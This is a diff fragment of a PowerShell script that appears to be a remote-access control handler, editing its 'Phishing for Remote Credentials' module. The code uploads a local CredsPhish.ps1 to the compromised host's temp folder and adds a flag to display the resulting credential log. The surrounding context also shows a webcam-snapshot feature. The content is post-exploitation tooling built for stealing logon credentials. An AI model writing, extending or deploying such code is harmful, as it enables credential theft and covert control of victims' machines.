@@ -1423,7 +1423,7 @@ While($Client.Connected)
           $File = "$Bin$name"
           $timestamp = Get-date -DisplayHint Time;
           write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;
-          write-host " [$timestamp] Waiting for valid credentials .." -ForegroundColor Yellow;Start-Sleep -Seconds 2;
+          write-host " [$timestamp] Waiting for valid credentials ✔" -ForegroundColor Yellow;Start-Sleep -Seconds 2;
           If(([System.IO.File]::Exists("$File")))
           {
             ## Write Local script (CredsPhish.ps1) to Remote-Host $env:tmp
@@ -1436,6 +1436,7 @@ While($Client.Connected)
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
             $Upload = $True;
+            $Phishing = $True;
           }else{
             ## Local File { CredsPhish.ps1 } not found .
             Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
@@ -1443,7 +1444,7 @@ While($Client.Connected)
             Write-Host "   Not Found  $File" -ForeGroundColor red;
             $File = $Null;
             $Command = $Null;
-            $Upload = $False; 
+            $Upload = $False;
           }
         }
         If($cred_choise -eq "ReadLog" -or $cred_choise -eq "ReadLog")
@@ -1727,6 +1728,12 @@ While($Client.Connected)
           {
             write-host "   image    `$env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
             $Camflop = "False";
+          }
+          If($Phishing  -eq "True")
+          {
+            $OutPut = $OutPut -replace ".ps1",".log";
+            write-host "   output   $OutPut";
+            $Phishing = "False";
           }
           $Command = $Null;
         } Else {
